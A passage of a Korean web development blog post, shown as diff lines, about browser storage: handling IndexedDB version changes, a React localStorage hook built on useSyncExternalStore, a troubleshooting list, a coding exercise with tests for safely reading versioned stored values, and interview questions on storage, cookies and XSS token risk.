+탭 A가 연결을 닫기 전까지 1초 동안 탭 B는 `blocked` 상태로 멈춰 있었다. 탭 A가 끝내 닫지 않으면 탭 B는 계속 기다린다. 배포 뒤 "새로 연 탭이 하얀 화면에서 안 넘어간다"는 증상이 이것이다. 옛 탭이 `versionchange` 이벤트를 받으면 연결을 닫고 새로고침을 안내하게 짜 둔다.
+
+```js
+db.onversionchange = () => {
+  db.close();
+  showBanner("새 버전이 있다. 새로고침해 달라.");
+};
+```
+
+## React에서 저장소 값을 읽을 때
+
+React 컴포넌트에서 localStorage를 읽는 흔한 방법은 `useState(() => localStorage.getItem(...))`다. 처음 한 번은 맞지만, 다른 컴포넌트나 다른 탭이 값을 바꿔도 이 컴포넌트는 모른다. 저장소는 React 밖에 있는 외부 저장소라서 `useSyncExternalStore`로 구독하는 게 맞다.
+
+```js
+function subscribe(cb) {
+  window.addEventListener("storage", cb);        // 다른 탭이 바꿨을 때
+  window.addEventListener("local-storage", cb);  // 같은 탭에서 바꿨을 때(직접 쏜다)
+  return () => {
+    window.removeEventListener("storage", cb);
+    window.removeEventListener("local-storage", cb);
+  };
+}
+
+function useLocalStorage(key, fallback) {
+  const raw = useSyncExternalStore(subscribe, () => localStorage.getItem(key), () => null);
+  const value = raw === null ? fallback : raw;
+  const set = (v) => {
+    localStorage.setItem(key, v);
+    window.dispatchEvent(new Event("local-storage"));  // storage 이벤트는 같은 탭에 안 온다
+  };
+  return [value, set];
+}
+```
+
+탭 두 개에 이 훅을 쓰는 `Badge`를 띄우고, 탭 A에서 토글을 눌렀다(React 19.3 개발 빌드).
+
+```text
+[tab A] Badge render light
+[tab B] Badge render light
+--- click in A
+[tab B] Badge render dark
+[tab A] Badge render dark
+```
+
+탭 A는 직접 쏜 `local-storage` 이벤트로, 탭 B는 브라우저가 보낸 `storage` 이벤트로 다시 그렸다. 스냅숏 함수가 문자열을 그대로 돌려주는 점도 중요하다. 여기서 `JSON.parse`를 하면 호출할 때마다 새 객체가 나와 React가 값이 계속 바뀐다고 보고 무한히 다시 그린다. 파싱은 스냅숏 밖에서, 문자열이 바뀔 때만 한다. 이유는 [리렌더링 글](/posts/react-rerender)의 참조 비교와 같다.
+
+세 번째 인자 `() => null`은 서버 렌더링용 스냅숏이다. 서버에는 localStorage가 없으니 서버 HTML은 기본값으로 그려지고, 브라우저에서 저장된 값으로 바뀐다. 다크 모드처럼 첫 화면에 바로 보이는 값이면 이 순간 화면이 깜빡인다. 이 블로그는 `layout.tsx`에서 렌더링 전에 도는 작은 스크립트로 `html[data-theme]`을 먼저 정해 이 깜빡임을 막는다.
+
+## 현장에서 저장소 문제를 만나는 순간
+
+증상에서 원인으로 가는 길을 모았다. 확인은 대부분 개발자 도구의 Application 패널(Local storage, Session storage, Cookies, IndexedDB 항목)에서 한다.
+
+에러 수집기에 `SyntaxError: "undefined" is not valid JSON`이 첫 화면에서 쌓인다. 예전 버전 코드가 `undefined`를 저장했고, 지금 코드가 그 값을 `JSON.parse`한다. 파싱을 `try`로 감싸고 형식이 틀리면 기본값으로 돌아가게 한다. 아래 연습 문제가 이 함수다.
+
+`QuotaExceededError`가 일부 사용자에게만 난다. 캐시를 localStorage에 계속 쌓는 코드가 있는지 본다. Application 패널에서 키별 값 길이를 보면 범인이 보인다. 캐시는 IndexedDB나 메모리로 옮기고, localStorage에는 설정만 둔다.
+
+다른 탭에서 로그아웃했는데 이 탭은 로그인 상태다. `storage` 이벤트나 `BroadcastChannel`로 탭 사이에 알리지 않았다. 토큰이 메모리에만 있다면 저장소 이벤트도 없으니 `BroadcastChannel`을 쓴다.
+
+새 탭으로 열면 로그인이 풀린다. 토큰이 sessionStorage에 있다.
+
+도메인을 옮겼더니 설정이 사라졌다. 출처가 바뀌어 다른 칸을 보고 있다. 옛 칸의 값은 옛 출처에서만 읽을 수 있다.
+
+배포 뒤 일부 사용자의 화면이 로딩에서 멈춘다. IndexedDB 버전을 올렸는데 옛 탭이 연결을 쥐고 있다. `onblocked`와 `onversionchange` 처리가 있는지 본다.
+
+## 저장된 값을 안전하게 꺼내기
+
+직접 짜 보자. localStorage에서 꺼낸 문자열 `raw`, 현재 시각 `now`(ms), 기본값 `fallback`을 받는다. 저장 형식은 `{"v":2,"value":...,"expiresAt":숫자 또는 null}`이다. 아래 경우에는 `fallback`을 돌려주고, 아니면 `value`를 돌려준다.
+
+- `raw`가 `null`이다 (저장된 적 없음)
+- JSON으로 읽을 수 없다
+- 객체가 아니거나 `v`가 2가 아니다 (옛 형식)
+- `expiresAt`이 숫자이고 `now`가 그 시각 이상이다
+
+<CodePlayground
+  caption="버전과 만료가 있는 저장 값 읽기"
+  functionName="readStored"
+  initialCode={`function readStored(raw, now, fallback) {
+  // raw: localStorage.getItem의 결과 (문자열 또는 null)
+  return null;
+}`}
+  solution={`function readStored(raw, now, fallback) {
+  if (raw === null) return fallback;
+  let box;
+  try {
+    box = JSON.parse(raw);
+  } catch {
+    return fallback;
+  }
+  if (box === null || typeof box !== "object" || box.v !== 2) return fallback;
+  if (typeof box.expiresAt === "number" && now >= box.expiresAt) return fallback;
+  return box.value;
+}`}
+  tests={[
+    { args: [null, 1000, "light"], expected: "light", label: "아직 저장 안 함" },
+    { args: ['{"v":2,"value":"dark","expiresAt":null}', 1000, "light"], expected: "dark", label: "만료 없음" },
+    { args: ['{"v":2,"value":"dark","expiresAt":5000}', 4999, "light"], expected: "dark", label: "만료 직전" },
+    { args: ['{"v":2,"value":"dark","expiresAt":5000}', 5000, "light"], expected: "light", label: "만료 시각이 되면" },
+    { args: ["dark", 1000, "light"], expected: "light", label: "옛 버전이 문자열로 넣은 값" },
+    { args: ['{"v":1,"theme":"dark"}', 1000, "light"], expected: "light", label: "버전이 다르다" },
+    { args: ["undefined", 1000, "light"], expected: "light", label: "undefined를 넣었던 흔적" },
+    { args: ['{"v":2,"value":false,"expiresAt":null}', 1000, true], expected: false, label: "false도 값이다" },
+    { args: ['{"v":2,"value":{"ids":[3,1]},"expiresAt":null}', 1000, null], expected: { ids: [3, 1] }, label: "객체 값" },
+  ]}
+/>
+
+`"dark"`처럼 따옴표 없는 문자열은 JSON이 아니라서 파싱에서 걸러진다. `false` 테스트는 `value || fallback`처럼 짜면 틀린다. 저장된 `false`가 기본값 `true`로 바뀌어 처음 장면의 "알림 끄기" 버그가 다시 생긴다.
+
+## 다시 알림 토글로
+
+처음 토글이 새로고침 뒤 다시 켜진 건 `false`가 문자열 `"false"`로 저장됐고, 그 문자열이 참이었기 때문이다. 값을 JSON으로 넣고, 꺼낼 때 형식을 검사하고, 실패해도 기본값으로 돌아가면 된다. 저장소를 고르는 기준은 서버가 알아야 하는가(쿠키), 크거나 구조가 있는가(IndexedDB), 탭 하나에서만 의미가 있는가(sessionStorage), 그 밖의 작은 설정인가(localStorage)다. 그리고 어느 저장소든 같은 출처의 스크립트에게는 다 열려 있다는 사실을 잊지 않는다.
+
+## 면접에서 나올 만한 질문
+
+### localStorage, sessionStorage, 쿠키는 어떻게 다른가요?
+
+수명과 범위, 서버로 가는지가 다르다. localStorage는 출처별로 지울 때까지 남고, sessionStorage는 출처와 탭에 묶여 탭을 닫으면 사라진다. 쿠키는 도메인과 경로로 묶이고 요청마다 서버로 실려 간다. 크기도 Web Storage는 출처당 약 5MB, 쿠키는 하나에 약 4KB다.
+
+### localStorage가 성능에 문제가 될 수 있나요?
+
+동기 API라서 그렇다. `setItem`과 `getItem`이 끝날 때까지 메인 스레드가 멈춘다. 4MB짜리 값을 `JSON.stringify` 후 저장하면 크로미움에서도 50ms 넘게 걸려 긴 작업이 된다. 큰 데이터는 비동기인 IndexedDB로 옮기고, 자주 바뀌는 값은 디바운스로 저장 횟수를 줄인다.
+
+### 액세스 토큰을 localStorage에 두면 왜 위험한가요?
+
+같은 출처에서 도는 스크립트는 localStorage를 전부 읽을 수 있어서, XSS가 하나 생기면 토큰이 밖으로 새어 나간다. 공격자는 그 토큰을 자기 기기에서 만료될 때까지 쓴다. `HttpOnly` 쿠키는 스크립트가 읽을 수 없어 토큰 유출은 막지만, 탭이 열린 동안 스크립트가 보낸 요청에는 여전히 붙는다. 그래서 HttpOnly는 피해를 줄이는 장치이고 XSS 자체는 출력 인코딩과 CSP로 막는다.
+
+### storage 이벤트는 언제 발생하나요?
+
+같은 출처의 다른 문서에서 localStorage가 바뀌었을 때 발생한다. 값을 바꾼 탭 자신에게는 오지 않고, 같은 값을 다시 넣으면 바뀐 게 없어서 오지 않는다. `removeItem`은 `newValue`가 `null`, `clear()`는 `key`가 `null`로 온다. 같은 탭 안의 컴포넌트에 알리려면 직접 이벤트를 쏘거나 상태 관리 도구를 쓴다.
+
+### 포트만 다른 두 페이지는 localStorage를 공유하나요? 쿠키는요?
+
+localStorage는 공유하지 않는다. 출처는 스킴, 호스트, 포트가 모두 같아야 같다. 쿠키는 포트를 보지 않고 도메인과 경로로만 묶여서 공유된다. 그래서 `localhost`에서 포트만 다르게 띄운 두 앱은 같은 이름의 세션 쿠키를 서로 덮어쓸 수 있다.
+
+### IndexedDB 트랜잭션 안에서 fetch를 await하면 어떻게 되나요?
+
+트랜잭션이 먼저 커밋되고 닫혀서, 돌아와서 거는 요청은 `TransactionInactiveError`가 난다. 트랜잭션은 걸린 요청이 다 끝나고 새 요청이 없으면 스스로 커밋한다. 네트워크를 기다리는 동안은 할 일이 없는 상태다. 필요한 데이터는 트랜잭션을 열기 전에 모두 받아 둔다.
+
+### React에서 localStorage 값을 상태처럼 쓰려면 어떻게 하나요?
+
+`useSyncExternalStore`로 구독한다. 구독 함수에서 `storage` 이벤트와 같은 탭용 사용자 정의 이벤트를 듣고, 스냅숏 함수는 문자열을 그대로 돌려준다. 스냅숏에서 `JSON.parse`를 하면 매번 새 객체가 나와 무한 렌더링이 생긴다. 서버 렌더링에서는 저장소가 없으니 서버용 스냅숏을 주고, 첫 화면에 보이는 값은 깜빡임을 막는 장치를 따로 둔다.
+
+### 브라우저 저장소에 넣은 데이터는 영구적인가요?
+
+아니다. 기본은 브라우저가 디스크가 모자랄 때 지울 수 있는 저장소이고, 사파리는 7일 동안 상호작용이 없으면 스크립트가 만든 저장소를 지울 수 있다. 사용자가 사이트 데이터를 지우거나 막을 수도 있다. 그래서 지워져도 서버에서 다시 받아 복구할 수 있게 짜고, 사용자의 유일한 원본을 브라우저에만 두지 않는다.
